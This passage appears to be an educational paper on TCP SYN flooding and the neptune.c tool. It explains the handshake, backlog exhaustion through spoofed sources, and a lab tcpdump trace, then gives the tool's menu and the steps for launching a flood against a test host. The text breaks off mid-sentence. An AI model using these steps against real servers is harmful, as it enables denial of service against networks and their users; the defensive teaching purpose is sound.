<p><font size="2" face="Courier New">+----------+&nbsp;&nbsp;&nbsp;&nbsp; \send ACK&nbsp;&nbsp;&nbsp; +----------+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+----------+ </font></p>
<p><font size="2" face="Courier New">|FIN WAIT-2|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | CLOSING&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | LAST 
ACK | </font></p>
<p><font size="2" face="Courier New">+----------+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +----------+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +----------+ </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | recv ACK&nbsp;&nbsp;&nbsp;&nbsp; recv ACK of FIN 
| </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; V&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; V </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +----------+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +----------+ </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----&gt;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp; TIMEOUT:&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; recv FIN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |TIME WAIT |-----------------&gt;|&nbsp; 
CLOSED&nbsp; | </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ----------------------&gt;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; send ACK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +----------+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +----------+ </font></p>
<p><font size="2" face="Courier New">&nbsp; </font></p>
<p><font size="3" face="Arial"> </font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The TCP connection 
consists of three major steps, a request, an acknowledgement and an 
agreed upon connection. The initiating host, denoted below as Host1, 
will request a connection with a target server, denoted as Host2. The 
target server must acknowledge the request. The acknowledgement to Host1 
indicates that Host2 is willing and ready to establish a session, and 
sets up the bi-directional method of ensuring proper data transmission. 
Host1 must acknowledge the receipt of this message and a session will 
be established.</font>&nbsp;<br /></p>
<ol type="1">
  <font size="3" face="Arial"><li>&lt;src=Host1&gt;&lt;dst=Host2&gt;&lt;flag=<B style="color:black;background-color:#A0FFFF">SYN</B>&gt;&lt;Seq1 
  12345&gt;&lt;Data&gt;&nbsp;<br />
  &nbsp;<br />
  Host1 requests a TCP connection to communicate with Host2. Host1 constructs 
  a TCP packet and sets one of the values in the packet to the <B style="color:black;background-color:#A0FFFF">SYN</B> state. 
  The <B style="color:black;background-color:#A0FFFF">SYN</B> flag indicates that Host1 would like to establish a session. 
  Host1 also needs to define its starting sequence number for the synchronization 
  of further communications. This randomly generated sequence number (Seq1) 
  is set and sent along with the <B style="color:black;background-color:#A0FFFF">SYN</B> flag. This sequence number will be 
  incremented in each successive packet sent by Host1. After receiving 
  the packet from Host1, Host2 places an entry in its backlog table noting 
  that a session establishment procedure is underway.</font></li>
</ol>
&nbsp;<br />
<ol type="1" start="2">
  <font size="3" face="Arial"><li>&lt;src=Host2&gt;&lt;dst=Host1&gt;&lt;flag=<B style="color:black;background-color:#A0FFFF">SYN</B>-ACK&gt;&lt;Seq2 
  67890&gt;&lt;Ack1 12346&gt;&lt;Data&gt;&nbsp;<br />
  &nbsp;<br />
  &nbsp; Host2 creates an acknowledgment packet to send to Host1. This 
  packet contains several pieces of information. One piece of information 
  is the acknowledgement (ACK) of the packet received from Host1. This 
  confirms the receipt of the <B style="color:black;background-color:#A0FFFF">SYN</B> and agrees to the connection. Host2 
  will include an incremented sequence number (Ack1) indicating which 
  packet it expects to receive next from Host1. It also contains its own 
  <B style="color:black;background-color:#A0FFFF">SYN</B> flag and a randomly generated sequence number (Seq2) for its own 
  packet stream. Host1 must receive this <B style="color:black;background-color:#A0FFFF">SYN</B>-ACK packet before establishing 
  the connection.&nbsp;<br />
  </font></li>
  <font size="3" face="Arial"><li>&lt;src=Host1&gt;&lt;dst=Host2&gt;&lt;flag=ACK&gt;&lt;Seq1 
  12346&gt;&lt;Ack2 67891&gt;&lt;Data&gt;&nbsp;<br />
  &nbsp;<br />
  &nbsp; Host1 then generates the final packet to send to Host2. This 
  packet contains the ACK flag, the incremented sequence number (Seq1), 
  which is expected by Host2, and the incremented sequence number it expects 
  to see next from Host2 (Ack2). Host2, receiving the packet, sees that 
  a session has been properly established and removes the temporary entry 
  from the backlog table indicating that the session is now established.</font></li>
</ol>
<h2><font size="3" face="Arial">How the exploit works</font></h2>
&nbsp;<br />
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Developed 
by the hackers known as daemon9, route and infinity, the <B style="color:black;background-color:#99ff99">neptune</B>.c exploit 
was published in Phrack magazine in July of 1996. <B style="color:black;background-color:#99ff99">Neptune</B>.c and its 
cousins are known as <B style="color:black;background-color:#A0FFFF">SYN</B> Flooders. These tools function by initiating 
a connection to the target host but never returning the final acknowledgment 
of the three-way handshake previously described. The target host, having 
sent the <B style="color:black;background-color:#A0FFFF">SYN</B>-ACK packet, is left waiting for the final ACK packet from 
the attacker. During this waiting period, the host holds the entry in 
its backlog table until the attempt times out. The attacking host continues 
initiating connection establishment sessions. In doing so, the target 
hosts backlog table will be filled. Thus the target host can no longer 
accept new connections and service has effectively been denied.</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">To 
begin the process of flooding a host, <B style="color:black;background-color:#99ff99">neptune</B>.c creates multiple <B style="color:black;background-color:#A0FFFF">SYN</B> 
packets and sends them to the target host. To reliably get back to the 
sending host, the recipient will reply using the original packets <B style="color:black;background-color:#ff9999">source</B> 
address. Ideally, the attackers TCP will acknowledge the packet and 
a session will be established. Because the desired effect is to prevent 
the three-way handshake from being completed, the attacker will forge, 
or <B style="color:black;background-color:#ffff66">spoof</B>, the <B style="color:black;background-color:#ff9999">source</B> address of its original <B style="color:black;background-color:#A0FFFF">SYN</B> packet. Therefore the 
destination address used for the <B style="color:black;background-color:#A0FFFF">SYN</B>-ACK is not the same as the actual 
<B style="color:black;background-color:#ff9999">source</B> address of the attacker.</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">When 
the target sends the <B style="color:black;background-color:#A0FFFF">SYN</B>-ACK packet it will send it to the apparent 
sender of the packet based on the <B style="color:black;background-color:#ff9999">source</B> address. If there is a host 
existing on the network using that spoofed address, that host will receive 
a <B style="color:black;background-color:#A0FFFF">SYN</B>-ACK packet it wasnt expecting and reply with a reset (RST) command 
to cancel the session establishment procedure. When the target host 
receives this RST command it will then remove the entry from its backlog 
table. The desired effect is to fill up the backlog table waiting for 
final ACK packets. To achieve the <B style="color:black;background-color:#A0FFFF">SYN</B> flood, the forged packet <B style="color:black;background-color:#ff9999">source</B> 
address must be an address that does not exist on the network. Therefore 
there will be no reply to the <B style="color:black;background-color:#A0FFFF">SYN</B>-ACK sent by the target.</font></p>
<h2><font size="3" face="Arial">Diagram</font></h2>
&nbsp;<br />
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">In 
this diagram, Host1 is the attacker, Host2 is the target and Host3 is 
our non-existent spoofed address.</font>&nbsp;<br /></p>
<p><font size="3" face="Arial">&lt;Host1&gt;&nbsp; ----- (src = Host3, 
dst = Host2, Seq1=12345, <B style="color:black;background-color:#A0FFFF">SYN</B>) </font><font size="3" face="Wingdings">à</font><font
 size="3" face="Arial">&nbsp; &lt;Host2&gt;</font>&nbsp;<br /></p>
<p><font size="3" face="Arial"> &nbsp;Host1 sends a <B style="color:black;background-color:#A0FFFF">SYN</B> packet to Host2 with 
a spoofed <B style="color:black;background-color:#ff9999">source</B> address.&nbsp; This occurs multiple times in order 
to fill up Host2s backlog table.</font>&nbsp;<br /></p>
<p><font size="3" face="Arial">&lt;Host3&gt; </font><font size="3" face="Wingdings">ß</font><font
 size="3" face="Arial">&nbsp; (src = Host2, dst = Host3, Seq1=98765, 
Ack2=12346, <B style="color:black;background-color:#A0FFFF">SYN</B>+ACK)---- &lt;Host2&gt;</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Host2 replies to the 
non-existent Host3 once for each <B style="color:black;background-color:#A0FFFF">SYN</B> packet sent to it by the attacker. 
Each <B style="color:black;background-color:#A0FFFF">SYN</B> packet received is listed in Host2s backlog table until it 
has been filled by the attacker on Host1. Since Host3 doesnt exist, 
it cannot reply with a RST to tear down the connection. Host2 will be 
unable to service any new connections until space is freed up in the 
backlog table.</font>&nbsp;<br /></p>
<ul><p><font size="3" face="Arial">A network trace of the exploit, captured 
by tcpdump on a RedHat Linux 7.1 system, looks like this:</font>&nbsp;<br />
</p></ul>
<p><font size="2" face="Courier New">18:52:11.337301 10.3.3.3.7173 &gt; 
192.168.0.15.80: S 2351624450:2351624450(0) win 242 (ttl 255, id 31492)</font></p>
<p><font size="3" face="Courier New">18:52:11.337992 192.1</font><font
 size="2" face="Courier New">68.0.15.80 &gt; 10.3.3.3.7173: S 594501320:594501320(0) 
ack 2351624451 win 9112 &lt;mss 1460&gt; (DF) (ttl 255, id 43051)</font></p>
<p><font size="3" face="Courier New">18:52:11.357302 10.3.3.3.7429 &gt; 
192.168.0.15.80: S 2368401666:2368401666(0) win 242 (ttl 255, id 31748)</font></p>
<p><font size="3" face="Courier New">18:52:11.357975 192.168.0.15.80 
&gt; 10.3.</font><font size="2" face="Courier New">3.3.7429: S 594615592:594615592(0) 
ack 2368401667 win 9112 &lt;mss 1460&gt; (DF) (ttl 255, id 43052)</font></p>
<p><font size="3" face="Courier New">18:52:11.377298 10.3.3.3.7685 &gt; 
192.168.0.15.80: S 2385178882:2385178882(0) win 242 (ttl 255, id 32004)</font></p>
<p><font size="3" face="Courier New">18:52:11.377996 192.168.0.15.80 
&gt; 10.3.3.3.7685: S 594745</font><font size="2" face="Courier New">162:594745162(0) 
ack 2385178883 win 9112 &lt;mss 1460&gt; (DF) (ttl 255, id 43053)</font></p>
<p><font size="3" face="Courier New">18:52:11.397296 10.3.3.3.7941 &gt; 
192.168.0.15.80: S 2401956098:2401956098(0) win 242 (ttl 255, id 32260)</font></p>
<p><font size="3" face="Courier New">18:52:11.398016 192.168.0.15.80 
&gt; 10.3.3.3.7941: S 594805488:594805488(0) a</font><font size="2" face="Courier New">ck 
2401956099 win 9112 &lt;mss 1460&gt; (DF) (ttl 255, id 43054)</font></p>
<p><font size="3" face="Courier New">18:52:11.417297 10.3.3.3.8197 &gt; 
192.168.0.15.80: S 2418733314:2418733314(0) win 242 (ttl 255, id 32516)</font></p>
<p><font size="3" face="Courier New">18:52:11.418481 192.168.0.15.80 
&gt; 10.3.3.3.8197: S 594869864:594869864(0) ack 2418733315 win </font><font
 size="2" face="Courier New">9112 &lt;mss 1460&gt; (DF) (ttl 255, id 
43055)</font></p>
<p><font size="3" face="Courier New">18:52:11.437296 10.3.3.3.8453 &gt; 
192.168.0.15.80: S 2435510530:2435510530(0) win 242 (ttl 255, id 32772)</font></p>
<p><font size="3" face="Courier New">18:52:11.438111 192.168.0.15.80 
&gt; 10.3.3.3.8453: S 594997958:594997958(0) ack 2435510531 win 9112 
&lt;mss 1460&gt; (D</font><font size="2" face="Courier New">F) (ttl 
255, id 43056)</font></p>
<p><font size="3" face="Courier New">18:52:11.457306 10.3.3.3.8709 &gt; 
192.168.0.15.80: S 2452287746:2452287746(0) win 242 (ttl 255, id 33028)</font></p>
<p><font size="3" face="Courier New">18:52:11.458117 192.168.0.15.80 
&gt; 10.3.3.3.8709: S 595031154:595031154(0) ack 2452287747 win 9112 
&lt;mss 1460&gt; (DF) (ttl 255, id 43</font><font size="2" face="Courier New">057)</font></p>
<p><font size="3" face="Courier New">18:52:11.477292 10.3.3.3.8965 &gt; 
192.168.0.15.80: S 2469064962:2469064962(0) win 242 (ttl 255, id 33284)</font></p>
<p><font size="3" face="Courier New">18:52:11.478106 192.168.0.15.80 
&gt; 10.3.3.3.8965: S 595071925:595071925(0) ack 2469064963 win 9112 
&lt;mss 1460&gt; (DF) (ttl 255, id 43058)</font></p>
<p><font size="3" face="Courier New">18:52:11.4972</font><font size="2" face="Courier New">92 
10.3.3.3.9221 &gt; 192.168.0.15.80: S 2485842178:2485842178(0) win 242 
(ttl 255, id 33540)</font></p>
<p><font size="3" face="Courier New">18:52:11.498399 192.168.0.15.80 
&gt; 10.3.3.3.9221: S 595091289:595091289(0) ack 2485842179 win 9112 
&lt;mss 1460&gt; (DF) (ttl 255, id 43059)</font></p>
<p><font size="3" face="Courier New">18:52:11.517293 10.3.3.3.9477 &gt;</font><font
 size="2" face="Courier New"> 192.168.0.15.80: S 2502619394:2502619394(0) 
win 242 (ttl 255, id 33796)</font></p>
<p><font size="3" face="Courier New">18:52:11.518103 192.168.0.15.80 
&gt; 10.3.3.3.9477: S 595120702:595120702(0) ack 2502619395 win 9112 
&lt;mss 1460&gt; (DF) (ttl 255, id 43060)</font></p>
<p><font size="3" face="Courier New">18:52:14.500255 192.168.0.15.80 
&gt; 10.3.3.3.4613: </font><font size="2" face="Courier New">S 593903557:593903557(0) 
ack 2183852291 win 9112 &lt;mss 1460&gt; (DF) (ttl 255, id 43061)</font></p>
<p><font size="2" face="Courier New">18:52:14.520100 192.168.0.15.80 
&gt; 10.3.3.3.4869: S 593965522:593965522(0) ack 2200629507 win 9112 
&lt;mss 1460&gt; (DF) (ttl 255, id 43062)</font></p>
<p><font size="3" face="Courier New">18:52:14.540100 192.168.0.15.80 
&gt; 10.</font><font size="2" face="Courier New">3.3.3.5125: S 593990084:593990084(0) 
ack 2217406723 win 9112 &lt;mss 1460&gt; (DF) (ttl 255, id 43063)</font></p>
<p><font size="3" face="Courier New">18:52:14.560109 192.168.0.15.80 
&gt; 10.3.3.3.5381: S 593999494:593999494(0) ack 2234183939 win 9112 
&lt;mss 1460&gt; (DF) (ttl 255, id 43064)</font></p>
<p><font size="3" face="Courier New">18:52:14.580139 192.168.0</font><font
 size="2" face="Courier New">.15.80 &gt; 10.3.3.3.5637: S 594103066:594103066(0) 
ack 2250961155 win 9112 &lt;mss 1460&gt; (DF) (ttl 255, id 43065)</font></p>
<p><font size="3" face="Courier New">18:52:14.600110 192.168.0.15.80 
&gt; 10.3.3.3.5893: S 594179955:594179955(0) ack 2267738371 win 9112 
&lt;mss 1460&gt; (DF) (ttl 255, id 43066)</font></p>
<p><font size="3" face="Courier New">18:52:14.6200</font><font size="2" face="Courier New">94 
192.168.0.15.80 &gt; 10.3.3.3.6149: S 594285018:594285018(0) ack 2284515587 
win 9112 &lt;mss 1460&gt; (DF) (ttl 255, id 43067)</font></p>
<p><font size="2" face="Courier New">18:52:14.640116 192.168.0.15.80 
&gt; 10.3.3.3.6405: S 594297841:594297841(0) ack 2301292803 win 9112 
&lt;mss 1460&gt; (DF) (ttl 255, id 43068)</font></p>
<p><font size="3" face="Courier New">18:52:14.660097 192.168.0.15.80 
&gt; 10.3.3.3.6661: S 594353533:594353533(0) ack 2318070019 win 9112 
&lt;mss 1460&gt; (DF) (ttl 255</font><font size="2" face="Courier New">, 
id 43069)</font></p>
<p><font size="3" face="Courier New">18:52:14.680130 192.168.0.15.80 
&gt; 10.3.3.3.6917: S 594438996:594438996(0) ack 2334847235 win 9112 
&lt;mss 1460&gt; (DF) (ttl 255, id 43070)</font>&nbsp;<br />&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
tcpdump output lists the following information:</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
timestamp of the packet: This is the time at which the packet was captured. 
This time is based upon the system time of the computer system performing 
the tcpdump monitoring.</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
computer that was the <B style="color:black;background-color:#ff9999">source</B> of the packet: This computer host was either 
responsible for generating the traffic or, as is the case when <B style="color:black;background-color:#ff9999">source</B> 
address spoofing is being performed, is thought to be the host generating 
the packet. In the example above, the host 192.168.0.15 is the target 
host, a Solaris host running the Apache http server. The spoofed <B style="color:black;background-color:#ff9999">source</B> 
address is 10.3.3.3. Unseen in this exchange is the attacking host, 
a RedHat Linux 7.1 host running at 192.168.0.10.</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
tcp port being used to send the packet from the <B style="color:black;background-color:#ff9999">source</B> host: When a 
computer host sends a packet, there must be an address for the destination 
host to reply to, this is a combination of host address and port address. 
This can be compared to the return address on a piece of US Mail  If 
sent from someone in an apartment building, and apartment number (the 
port) must accompany the apartment building address (the IP address).</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
computer that was the destination of the packet: This is the address 
of the computer for which the packet is intended.</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
tcp port that was the destination for the packet: Similar to the <B style="color:black;background-color:#ff9999">source</B> 
port, the destination port is a specific application installed on the 
destination computer that is listening for a packet  either a response 
to a packet that it had sent, or a request from an application desiring 
service. In our analogy to the US Mail, the destination must consist 
of the address of the apartment building and the apartment number for 
the recipient.</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
tcp flag: Numerous flags can be set during a network session  These 
flags could be some combination of <B style="color:black;background-color:#A0FFFF">SYN</B> (S), RST (R), PSH (P) or FIN 
(F). It is also possible that no flags have been set. This is denoted 
by a .. In this case, we see numerous <B style="color:black;background-color:#A0FFFF">SYN</B> packets being sent, denoting 
that the sending computer desires a network session.</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
data sequence number: This set of numbers indicate the range of sequence 
numbers representing the user data, with the number of bytes of user 
data listed in parentheses. In the network trace above, no user data 
has been transferred, as session establishment is still underway. </font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">A 
possible ACK flag with a sequence number: If the packet is an acknowledgement 
of a received <B style="color:black;background-color:#A0FFFF">SYN</B> packet, the ACK flag will be set and a sequence number 
listing the next expected packet the sender is expecting to receive.</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
window available for receiving data: The sending computer can indicate 
how much buffer space has been set aside for the receiving of data. 
A large window indicates that higher performance data transfers can 
be attempted. If the receiving host begins to be overwhelmed with traffic, 
it can reduce the window size, requesting that the sender transmit fewer 
packets until the recipient can recover and get caught up.</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">TCP 
options: These will be listed in angled brackets (&lt;&gt;). In the 
provided network trace output, the tcp option &lt;mss 1460&gt; indicates 
the Maximum Segment Size. In this case, we are running 10Mb Ethernet, 
which has a maximum segment size of 1460 bytes. If the hosts are communicating 
across slow, wide area network (WAN) connections this setting may be 
reduced for better performance.</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">A 
Possible Dont Fragment flag. This is denoted by (DF) and indicates 
that any routers which may be involved in the distribution of these 
tcp packets are not allowed to fragment the packets. If this flag is 
set, the meaning of the maximum segment size becomes more important, 
as the routers arent allowed to reduct the packet size for better performance. 
The hosts would be responsible for packet size management.</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Lastly, 
we see a Time-To-Live (TTL) setting which indicates how many routers 
this packet may traverse before it is dropped. This setting is designed 
to prevent packets from endlessly travelling around a network. There 
is also a sequencing id value from the legitimate host, and a randomly 
generated id from the spoofed address. </font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">You 
can see from the trace, packets being sent with a <B style="color:black;background-color:#ff9999">source</B> address of 
10.3.3.3, our non-existent, spoofed address. The host 192.168.0.15 replies 
with a packet to 10.3.3.3 containing an ack number. After the initial 
attack, the last occurring with the timestamp </font><font size="2" face="Courier New">18:52:11.517293,</font><font
 size="3" face="Arial"> the attacked host continues to send out a number 
of <B style="color:black;background-color:#A0FFFF">SYN</B>-ACK retransmissions.</font></p>
<h2><font size="3" face="Arial">How to use the exploit</font></h2>
&nbsp;<br />
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial"><B style="color:black;background-color:#99ff99">Neptune</B>.c 
seems to be designed for use by an end-user of modest computer skill. 
It can be used with either a simple menu system or as a command line 
program with options. We will look at the menu version to demonstrate 
just how easy it is to perform this program. The interface:</font>&nbsp;<br />
&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">[&nbsp; 
daemon9&nbsp; ]</font>&nbsp;<br /></p>
<p><font size="3" face="Arial">[1]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Target:&nbsp;&nbsp;&nbsp;192.168.0.15</font></p>
<p><font size="3" face="Arial">[2]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Unreachable:&nbsp;&nbsp;10.3.3.3</font></p>
<p><font size="3" face="Arial">3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Send ICMP_ECHO(s) to unreachable</font></p>
<p><font size="3" face="Arial">[4]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Flooding:&nbsp;&nbsp;&nbsp;80</font></p>
<p><font size="3" face="Arial">[5]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Number SYNs:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;20</font>&nbsp;<br /></p>
<p><font size="3" face="Arial">6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Quit</font></p>
<p><font size="3" face="Arial">7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Launch Attack</font></p>
<p><font size="3" face="Arial">8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Daemonize</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Once the user selects 
an option the program prompts for a value. <B style="color:black;background-color:#99ff99">Neptune</B>.c is given all the 
information necessary to begin the attack. For example, the following 
steps were followed for this document:</font>&nbsp;<br /></p>
<ol type="1">
  <font size="3" face="Arial"><li>Select a target (192.168.0.15). </font></li>
  <font size="3" face="Arial"><li>Choose the address the attack 
  will appear to come from (10.3.3.3). </font></li>
  <font size="3" face="Arial"><li>Ping the address to ensure 
  that it is, in fact, unreachable. </font></li>
  <font size="3" face="Arial"><li>Select a port that the host 
  is listening on, in this example port 80 is selected, which is the apache 
  web server.</font></li>
  <font size="3" face="Arial"><li>Choose the number of <B style="color:black;background-color:#A0FFFF">SYN</B> packets 
  to send (20).</font></li>
</ol>
&nbsp;<br />
<p><font size="3" face="Arial">The attacker is now ready to launch the 
exploit.&nbsp; </font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Even 
someone with very little C programming skill, such as myself, can compile 
this code on many of the free or inexpensive TCP-based operating systems 
currently available, such as Linux of the various flavors of BSD Unix.</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
main limitation of <B style="color:black;background-color:#99ff99">neptune</B>.c lies in its spoofing of a <B style="color:black;background-color:#ff9999">source</B> address. 
The attacker can only specify one <B style="color:black;background-color:#ff9999">source</B> address for each instance of 
the program. This single <B style="color:black;background-color:#ff9999">source</B> address allows for modern routers and 
firewalls to detect the sudden inrush of <B style="color:black;background-color:#A0FFFF">SYN</B> packets. Todays routers 
and firewalls can be configured to take action to break the connections 
based on this sudden flood of packets from a single <B style="color:black;background-color:#ff9999">source</B> address. 
It is possible to reduce this limitation by using <B style="color:black;background-color:#99ff99">neptune</B>.c in command 
line mode. This would require the use of a scripting language to run 
